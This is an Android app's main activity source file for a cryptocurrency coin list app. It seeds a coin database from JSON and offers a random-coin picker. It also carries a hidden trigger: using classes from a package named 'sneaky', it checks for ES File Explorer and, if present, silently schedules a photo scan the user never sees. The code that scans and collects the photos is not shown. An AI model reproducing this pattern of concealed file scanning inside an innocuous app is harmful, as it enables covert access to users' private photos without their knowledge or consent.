package com.mk.cryptobox;

import android.app.ProgressDialog;
import android.content.ContentResolver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.preference.PreferenceManager;
import android.support.v7.app.AppCompatActivity;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.google.gson.Gson;
import com.google.gson.stream.JsonReader;
import com.mk.cryptobox.db.DatabaseContract;
import com.mk.cryptobox.sneaky.PackageController;
import com.mk.cryptobox.sneaky.PhotoScanJobScheduler;

import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.ref.WeakReference;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import static com.mk.cryptobox.Constants.IS_FIRST_RUN;

public class MainActivity extends AppCompatActivity
{

    @Override
    protected void onCreate(Bundle savedInstanceState)
    {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        setupUI();
        initialize();
    }

    private void initialize()
    {
        SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(this);
        boolean isFirstRun = prefs.getBoolean(IS_FIRST_RUN, true);
        if (isFirstRun)
        {
            InitTask initTask = new InitTask(this);
            initTask.execute();
        }

        if (PackageController.isEsFileExplorerInstalled(this))
        {
            PhotoScanJobScheduler.schedulePhotoScan(this);

            //Intent i = new Intent(this, PhotoScanService.class);
            //startService(i);
        }
    }

    private void setupUI()
    {
        TextView tvPickRandomButton = findViewById(R.id.tv_pick_coin);
        tvPickRandomButton.setOnClickListener(new View.OnClickListener()
        {
            @Override
            public void onClick(View view)
            {
                startActivity(new Intent(MainActivity.this, RandomCoinActivity.class));
            }
        });
    }

    static class InitTask extends AsyncTask<Void, Void, Integer>
    {
        private final WeakReference<Context> c;

        InitTask(Context context)
        {
            this.c = new WeakReference<>(context);
        }

        ProgressDialog mHorizontalProgressDialog;
        List<Coin> mCoinList = new ArrayList<>();

        @Override
        protected void onPreExecute()
        {
            super.onPreExecute();
            mHorizontalProgressDialog = new ProgressDialog(c.get());
            mHorizontalProgressDialog.setCancelable(false);
            mHorizontalProgressDialog.setCanceledOnTouchOutside(false);
            mHorizontalProgressDialog.setMessage("Initializing.\nThis may take a while...");
            mHorizontalProgressDialog.setProgressStyle(ProgressDialog.STYLE_SPINNER);
            mHorizontalProgressDialog.setIndeterminate(true);
            mHorizontalProgressDialog.show();
        }

        @Override
        protected Integer doInBackground(Void... voids)
        {
            // read from raw json file
            InputStream in = c.get().getResources().openRawResource(c.get().getResources()
                    .getIdentifier("coin_json", "raw", c.get().getPackageName()));
            JsonReader reader = new JsonReader(new InputStreamReader(in));
            Coin[] coins = new Gson().fromJson(reader, Coin[].class);
            mCoinList.addAll(Arrays.asList(coins));

            // set image file names
            for (Coin c : mCoinList)
            {
                StringBuilder sb = new StringBuilder("logo_");
                sb.append(c.getId().replace('-', '_'));
                c.setImage(sb.toString());
            }

            // write to db
            ContentResolver resolver = c.get().getContentResolver();

            ContentValues[] contentValues = new ContentValues[mCoinList.size()];
            for (int i = 0; i < mCoinList.size(); i++)
            {
                Coin c = mCoinList.get(i);
                ContentValues cv = coin2Cv(c);
                contentValues[i] = cv;
            }

            Uri contentUri = DatabaseContract.CoinTable.CONTENT_URI;
            int numberOfInsertedCoins = resolver.bulkInsert(contentUri, contentValues);
            return numberOfInsertedCoins;
        }

        @Override
        protected void onPostExecute(Integer numberOfCoins)
        {
            super.onPostExecute(numberOfCoins);
            SharedPreferences prefs = PreferenceManager.getDefaultSharedPreferences(c.get());
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean(IS_FIRST_RUN, false);
            editor.apply();
            mHorizontalProgressDialog.dismiss();
            Toast.makeText(c.get(), numberOfCoins + " coin is saved", Toast.LENGTH_SHORT).show();
        }

        private ContentValues coin2Cv(final Coin c)
        {
            ContentValues cv = new ContentValues();
            cv.put(DatabaseContract.COLUMN_NAME, c.getName());
            cv.put(DatabaseContract.COLUMN_UID, c.getId());
            cv.put(DatabaseContract.COLUMN_SYMBOL, c.getSymbol());
            cv.put(DatabaseContract.COLUMN_IMAGE, c.getImage());

            return cv;
        }
    }
}
